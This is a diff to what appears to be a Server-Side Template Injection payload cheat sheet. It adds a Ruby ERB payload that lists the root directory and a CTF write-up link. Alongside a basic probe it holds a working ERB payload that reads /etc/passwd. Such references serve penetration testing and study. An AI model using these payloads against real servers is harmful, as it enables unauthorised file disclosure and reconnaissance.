@@ -15,14 +15,20 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ### Basic injection
 
-```python
+```ruby
 <%= 7 * 7 %>
 ```
 
 ### Retrieve /etc/passwd
 
-```python
+```ruby
 <%= File.open('/etc/passwd').read %>
+```
+
+### List files and directories
+
+```ruby
+<%= Dir.entries('/') %>
 ```
 
 ## Java
@@ -229,3 +235,4 @@ $eval('1+1')
 * [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
 * [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
 * [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
